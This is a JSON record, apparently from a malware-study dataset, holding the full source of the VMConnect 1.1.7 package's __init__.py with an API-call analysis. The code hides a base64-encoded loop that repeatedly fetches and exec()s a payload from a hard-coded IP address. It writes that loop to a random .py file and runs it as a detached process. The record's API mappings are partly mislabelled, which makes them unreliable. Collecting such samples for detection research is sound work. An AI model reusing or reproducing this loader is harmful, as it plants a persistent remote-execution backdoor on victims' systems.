[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/vmconnect-1.1.7/VMConnect-1.1.7/src/VMConnect/__init__.py",
    "code_snippet": "import base64\nimport sys\nimport os\nimport subprocess\nimport random\nimport string\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\nstrb = ''\npyexecstr = ''\nstrstraddr = 'DQppbXBvcnQgYmFzZTY0DQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHN0cmluZw0KDQpweXBhdGhzdHIgPSBzeXMuZXhlY3V0YWJsZQ0KYmluZXhpdCA9IDANCnNhbXBsZV9zdHJpbmcgPSAnJw0Kc3Ryc3RyYWRyID0naHR0cDovLzQ1LjYxLjEzOS4yMTkvcGFwZXJwaW4zOTAyLmpwZycNCnN0cmIgPSAnJw0Kc3RycCA9ICcnDQpkZWxheUluU2Vjb25kcyA9IDYwDQpweWV4ZWNzdHIgPSAnJw0KDQpkZWYgZ2V0X3JhbmRvbV9zdHJpbmcobGVuZ3RoKToNCiAgICAjIGNob29zZSBmcm9tIGFsbCBsb3dlcmNhc2UgbGV0dGVyDQogICAgbGV0dGVycyA9IHN0cmluZy5hc2NpaV9sb3dlcmNhc2UNCiAgICByZXN1bHRfc3RyID0gJycuam9pbihyYW5kb20uY2hvaWNlKGxldHRlcnMpIGZvciBpIGluIHJhbmdlKGxlbmd0aCkpDQogICAgcmV0dXJuIHJlc3VsdF9zdHINCiAgICANCndoaWxlIGJpbmV4aXQgPT0gMDoNCglweWV4ZWNzdHIgPSAnJw0KCXN0cmIgPSAnJw0KCW1ta2IgPSAnJw0KCXN0cnAgPSAnJw0KCW1ta3AgPSAnJw0KCXRyeToNCgkJeCA9IHJlcXVlc3RzLmdldChzdHJzdHJhZHIsIGhlYWRlcnM9eydDYWNoZS1Db250cm9sJzogJ25vLWNhY2hlJywgIlByYWdtYSI6ICJuby1jYWNoZSJ9KQ0KCQliYXNlNjRfc3RyaW5nID0geC50ZXh0DQoJCXNmbT1iYXNlNjRfc3RyaW5nLmZpbmQoInwiKQ0KCQlpZiBzZm0gPiAwOg0KCQkJbW1rcD1iYXNlNjRfc3RyaW5nWzA6c2ZtXQ0KCQkJbW1rYj1iYXNlNjRfc3RyaW5nW3NmbSsxOmxlbihiYXNlNjRfc3RyaW5nKV0NCgkJZWxzZToNCgkJCW1ta2IgPSBiYXNlNjRfc3RyaW5nDQoNCgkJaWYgbGVuKG1ta3ApID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta3AuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJwID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCg0KCQkNCgkJaWYgbGVuKG1ta2IpID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta2IuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJiID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCglleGNlcHQ6DQoJCXBhc3MNCglpZiBsZW4oc3RyYikgPiAwOg0KCQl0cnk6DQoJCQlleGVjKHN0cmIpDQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCgkJCXBhc3MJDQoJDQoJdGltZS5zbGVlcChkZWxheUluU2Vjb25kcykNCg0K'\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "os.getlogin",
        "sys.executable",
        "platform.system",
        "get_random_string",
        "platform.system",
        "os.getcwd",
        "get_random_string",
        "open",
        "open.write",
        "open.close",
        "base64.b64decode",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "os.getlogin()",
        "sys.executable",
        "platform.system()",
        "get_random_string(6)",
        "platform.system()",
        "os.getcwd()",
        "get_random_string(8)",
        "open(pyexecstr, \"w\")",
        "f.write(strb)",
        "f.close()",
        "base64.b64decode(base64_bytes)",
        "subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) / subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.executable",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "get_random_string",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "get_random_string",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        }
      ],
      "contextual_code": "import base64\nimport sys\nimport os\nimport subprocess\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\n\n# ...\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL)\n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
    }
  }
]